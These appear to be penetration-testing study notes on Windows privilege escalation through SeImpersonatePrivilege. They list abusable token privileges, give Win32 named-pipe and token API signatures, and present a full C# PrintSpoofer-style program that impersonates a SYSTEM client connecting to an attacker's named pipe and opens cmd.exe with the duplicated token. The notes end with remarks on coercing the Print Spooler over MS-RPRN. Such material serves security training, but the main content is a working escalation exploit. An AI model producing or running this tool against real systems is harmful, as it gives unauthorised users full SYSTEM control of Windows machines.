9 abusable tokens:
1. **SeBackupPrivilege**
2. **SeCreateTokenPrivilege**
3. **SeDebugPrivilege**
4. **SeLoadDriverPrivilege**
5. **SeRestorePrivilege**
6. **SeTakeOwnershipPrivilege**
7. **SeTcbPrivilege**
8. **SeAssignPrimaryTokenPrivilege**
9. **SeImpersonatePrivilege**

If we have the SeImpersonatePrivilege, we can create a `Primary Token` from an `Impersonation Token` and create a new process, in the context of the impersonated user.

We can use named pipes to abuse impersonation

Source: https://learn.microsoft.com/en-us/windows/win32/ipc/named-pipes

We can force the system account to connect to a named pipe set up by an attacker (Abuse PrintSpooler service which runs as SYSTEM)

First key component:

- `ImpersonateNamedPipeClient` -> Allows impersonation of account that connects to the pipe

## APIs Needed

### CreateNamedPipeA
```cpp
HANDLE CreateNamedPipeA(
  [in]           LPCSTR                lpName, // Pipe Name
  [in]           DWORD                 dwOpenMode, // Open mode, PIPE_ACCESS_DUPLEX enum for bidirectional Pipe, or 3
  [in]           DWORD                 dwPipeMode, // Pipe mode, PIPE_TYPE_BYTE to directly write and read bytes with PIPE_WAIT to enable blocking mode. These two modes have a numerical value of 0
  [in]           DWORD                 nMaxInstances,
  [in]           DWORD                 nOutBufferSize,
  [in]           DWORD                 nInBufferSize,
  [in]           DWORD                 nDefaultTimeOut,
  [in, optional] LPSECURITY_ATTRIBUTES lpSecurityAttributes // Submit SID, set to NULL
);

// Source: https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createnamedpipea
```

### ConnectNamedPipe
```cpp
BOOL ConnectNamedPipe(
  [in]                HANDLE       hNamedPipe, // Pipe name
  [in, out, optional] LPOVERLAPPED lpOverlapped // Set to NULL, not needed
);

// Source: https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-connectnamedpipe
```

### ImpersonateNamedPipeClient
```cpp
BOOL ImpersonateNamedPipeClient(
  [in] HANDLE hNamedPipe
);

// Source: https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient
```

### OpenThreadToken
```cpp
BOOL OpenThreadToken(
  [in]  HANDLE  ThreadHandle,
  [in]  DWORD   DesiredAccess,
  [in]  BOOL    OpenAsSelf,
  [out] PHANDLE TokenHandle
);

// Source: https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openthreadtoken
```

### GetCurrentThread
```cpp
HANDLE GetCurrentThread();

// Source: https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getcurrentthread
```

### GetTokenInformation
```cpp
BOOL GetTokenInformation(
  [in]            HANDLE                  TokenHandle,
  [in]            TOKEN_INFORMATION_CLASS TokenInformationClass,
  [out, optional] LPVOID                  TokenInformation,
  [in]            DWORD                   TokenInformationLength,
  [out]           PDWORD                  ReturnLength
);

// Source: https://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-gettokeninformation
```

### ConvertSidToStringSidW
```cpp
BOOL ConvertSidToStringSidW(
  [in]  PSID   Sid,
  [out] LPWSTR *StringSid
);

// Source: https://learn.microsoft.com/en-us/windows/win32/api/sddl/nf-sddl-convertsidtostringsidw
```

### DuplicateTokenEx
```cpp
BOOL DuplicateTokenEx(
  [in]           HANDLE                       hExistingToken,
  [in]           DWORD                        dwDesiredAccess,
  [in, optional] LPSECURITY_ATTRIBUTES        lpTokenAttributes,
  [in]           SECURITY_IMPERSONATION_LEVEL ImpersonationLevel,
  [in]           TOKEN_TYPE                   TokenType,
  [out]          PHANDLE                      phNewToken
);

// Source: https://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-duplicatetokenex
```

### CreateProcessWithTokenW
```cpp
BOOL CreateProcessWithTokenW(
  [in]                HANDLE                hToken,
  [in]                DWORD                 dwLogonFlags,
  [in, optional]      LPCWSTR               lpApplicationName,
  [in, out, optional] LPWSTR                lpCommandLine,
  [in]                DWORD                 dwCreationFlags,
  [in, optional]      LPVOID                lpEnvironment,
  [in, optional]      LPCWSTR               lpCurrentDirectory,
  [in]                LPSTARTUPINFOW        lpStartupInfo,
  [out]               LPPROCESS_INFORMATION lpProcessInformation
);

// Source: https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw
```

## Custom PrintSpooferNet

```cs
using System;
using System.Runtime.InteropServices;
using System.Security.Permissions;
using System.Security.Principal;
using System.Text;

namespace PrintSpooferNet
{
    class Program
    {
        enum TOKEN_INFORMATION_CLASS
        {
            TokenUser = 1,
            TokenGroups,
            TokenPrivileges,
            TokenOwner,
            TokenPrimaryGroup,
            TokenDefaultDacl,
            TokenSource,
            TokenType,
            TokenImpersonationLevel,
            TokenStatistics,
            TokenRestrictedSids,
            TokenSessionId,
            TokenGroupsAndPrivileges,
            TokenSessionReference,
            TokenSandBoxInert,
            TokenAuditPolicy,
            TokenOrigin
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct SID_AND_ATTRIBUTES
        {
            public IntPtr Sid;
            public int Attributes;
        }

        public struct TOKEN_USER
        {
            public SID_AND_ATTRIBUTES User;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct STARTUPINFO
        {
            public Int32 cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr CreateNamedPipe(string lpName, uint dwOpenMode, uint dwPipeMode, uint nMaxInstances, uint nOutBufferSize, uint nInBufferSize, uint nDefaultTimeOut, IntPtr lpSecurityAttributes);

        [DllImport("kernel32.dll")]
        static extern bool ConnectNamedPipe(IntPtr hNamedPipe, IntPtr lpOverlapped);

        [DllImport("advapi32.dll")]
        static extern bool ImpersonateNamedPipeClient(IntPtr hNamedPipe);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool OpenThreadToken(IntPtr ThreadHandle, uint DesiredAccess, bool OpenAsSelf, out IntPtr TokenHandle);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetCurrentThread();

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool GetTokenInformation(IntPtr TokenHandle, TOKEN_INFORMATION_CLASS TokenInformationClass, IntPtr TokenInformation, int TokenInformationLength, out int ReturnLength);

        [DllImport("advapi32", CharSet = CharSet.Auto, SetLastError = true)]
        static extern bool ConvertSidToStringSid(IntPtr pSid, out IntPtr strSid);

        [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public extern static bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes, uint ImpersonationLevel, uint TokenType, out IntPtr phNewToken);

        [DllImport("advapi32", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern bool CreateProcessWithTokenW(IntPtr hToken, UInt32 dwLogonFlags, string lpApplicationName, string lpCommandLine, UInt32 dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
        public static void Main(string[] args)
        {
            // Parse arguments (pipe name)
            if (args.Length == 0)
            {
                Console.WriteLine("Example: PrintSpoofer.exe pipename");
                return;
            }
            // Create our named pipe
            string pipeName = args[0];
            IntPtr hPipe = CreateNamedPipe(pipeName, 3, 0, 10, 0x1000, 0x1000, 0, IntPtr.Zero);

            ConnectNamedPipe(hPipe, IntPtr.Zero);

            ImpersonateNamedPipeClient(hPipe);

            IntPtr hToken;
            OpenThreadToken(GetCurrentThread(), 0xF01FF, false, out hToken);

            int TokenInfLength = 0;
            GetTokenInformation(hToken, TOKEN_INFORMATION_CLASS.TokenUser, IntPtr.Zero, TokenInfLength, out TokenInfLength);
            IntPtr TokenInformation = Marshal.AllocHGlobal((IntPtr)TokenInfLength);
            GetTokenInformation(hToken, TOKEN_INFORMATION_CLASS.TokenUser, TokenInformation, TokenInfLength, out TokenInfLength);

            TOKEN_USER TokenUser = (TOKEN_USER)Marshal.PtrToStructure(TokenInformation, typeof(TOKEN_USER));
            IntPtr pstr = IntPtr.Zero;
            bool ok = ConvertSidToStringSid(TokenUser.User.Sid, out pstr);
            string sidstr = Marshal.PtrToStringAuto(pstr);

            IntPtr hSystemToken = IntPtr.Zero;
            DuplicateTokenEx(hToken, 0xF01FF, IntPtr.Zero, 2, 1, out hSystemToken);

            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
            STARTUPINFO si = new STARTUPINFO();
            si.cb = Marshal.SizeOf(si);
            CreateProcessWithTokenW(hSystemToken, 0, null, "C:\\Windows\\System32\\cmd.exe", 0, IntPtr.Zero, null, ref si, out pi);
        }
    }
}
```

We can abuse the PrintSpooler service which uses the `MS-RPRN` Protocol

`MS-RPRN` works through named pipes

The source comes from the `RpcOpenPrinter` and `RpcRemoteFindFirstChangeNotification` Functions

PrintSpooler unmanaged library: `RpcRT4.dll`

Uses binary format `NdrClientCall2` to pass and invoke underlying functions